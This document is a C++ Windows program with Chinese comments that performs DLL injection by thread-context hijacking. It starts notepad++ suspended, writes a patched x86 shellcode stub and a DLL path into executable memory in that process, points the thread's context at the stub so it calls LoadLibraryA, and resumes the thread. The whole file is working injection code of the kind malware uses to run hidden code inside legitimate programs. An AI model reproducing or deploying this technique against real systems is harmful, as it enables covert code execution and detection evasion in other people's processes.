 // SetThreadContext.cpp : 定义控制台应用程序的入口点。
//
#include <Windows.h>
#include <iostream>
#include <Shlwapi.h>

#pragma  comment(lib, "Shlwapi.lib")

typedef struct _SHELL_CODE
{
	char szPath[MAX_PATH];
	char szInstruction[0x100];
}SHELL_CODE, *PSHELL_CODE;
int main()
{
	STARTUPINFOA Si = { 0 };
	PROCESS_INFORMATION  Pi = { 0 };
	CONTEXT Context = { 0 };
	LPVOID Buffer = NULL;
	TCHAR ApplicationName[MAX_PATH] = { 0 };
	TCHAR CurrentDriectory[MAX_PATH] = { 0 };
	//创建进程
	Si.cb = sizeof(Si);
	if (!CreateProcessA(NULL,"D:\\SoftWare\\notepad++\\notepad++.exe",NULL,NULL,FALSE,CREATE_SUSPENDED,
		NULL,NULL,&Si,&Pi))
	{
		int a = GetLastError();
		printf("Error To CreateProcess\r\n");
		return 0;

	}
	CHAR szDllName[] = "J:\\注入\\SetThreadContext\\Debug\\Inject.dll";
	Context.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(Pi.hThread,&Context))
	{
		printf("Error To GetThreadContext\r\n");
		return 0;
	}
	CHAR szShellCode[] = "\x60\x68\x12\x34\x56\x78\xb8\x12\x34\x56\x78\xff\xd0\x61\xe9\x12\x34\x56\x78";

	Buffer = VirtualAllocEx(Pi.hProcess, NULL, sizeof(szShellCode),
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (Buffer == NULL)
	{
		printf("Error To VirtualAllocEx\r\n");
		return 0;
	}
	//push Address of Buffer
	*(DWORD*)(szShellCode + 2) = (DWORD)Buffer;

	*(DWORD*)(szShellCode + 7) = (DWORD)LoadLibraryA;

	*(DWORD*)(szShellCode + 15) =
		Context.Eax - (DWORD)((PUCHAR)Buffer + FIELD_OFFSET(SHELL_CODE,
			szInstruction) + sizeof(szShellCode) - 1);

	SHELL_CODE ShellCode;
	CopyMemory(((PSHELL_CODE)&ShellCode)->szPath, szDllName, sizeof(szDllName));
	CopyMemory(((PSHELL_CODE)&ShellCode)->szInstruction, szShellCode, sizeof(szShellCode));

	DWORD dwNunberofBytesToWrite = 0;
	if (!WriteProcessMemory(Pi.hProcess, Buffer, &ShellCode, sizeof(SHELL_CODE), &dwNunberofBytesToWrite))
	{
		printf("Error To WriteProcessMemory\r\n");
		return 0;
	}
	Context.Eax = (DWORD)(((PSHELL_CODE)Buffer)->szInstruction);
	if (!SetThreadContext(Pi.hThread,&Context))
	{
		
		printf("Error To SetThreadContext\r\n");
		return 0;
	}
	ResumeThread(Pi.hThread);
	return 0;
}
